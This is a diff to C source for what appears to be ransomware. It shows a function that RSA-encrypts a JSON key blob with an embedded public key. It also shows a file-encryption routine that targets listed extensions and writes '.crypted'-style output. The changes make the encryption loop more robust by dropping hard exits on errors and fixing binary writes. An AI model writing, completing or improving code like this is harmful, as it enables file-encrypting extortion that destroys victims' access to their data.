@@ -24,9 +24,14 @@ unsigned char *rsa_encode(unsigned char *json, size_t *len)
     char pub[] = "MY_PUBLIC_KEY";
 
     rsa  = createRSA((unsigned char *)pub, 1);
+
     if (!(data = malloc(RSA_size(rsa))))
+    {
         exit(0);
+    }
+
     *len = RSA_public_encrypt((int)strlen((char *)json), json, data, rsa, RSA_PKCS1_PADDING);
+
     RSA_free(rsa);
     if (*len > 0)
         return data;
@@ -74,10 +79,14 @@ void encrypt_file(unsigned char key[], unsigned char iv[], const char *path)
     if (check_ext(path) == 0)   // If extension is not in list --> dont encrypt.
         return;
     if (!(fd = fopen(path, "rb")))
-        handleError();
-    encrypted_filename = str_concat(2, path, ".crypted");
-    if (!(crypted_fd = fopen(encrypted_filename, "w")))
-        handleError();
+        return ;
+    encrypted_filename = str_concat(2, path, EXTENSION);
+    if (!(crypted_fd = fopen(encrypted_filename, "wb")))
+    {
+        free(encrypted_filename);
+        fclose(fd);
+        return;
+    }
     while ((size = fread(clear_text, 1, sizeof(clear_text), fd)) > 0)
     {
         encrypt (clear_text, (int)size, key, iv, encrypted_text); // Encrypt the text.
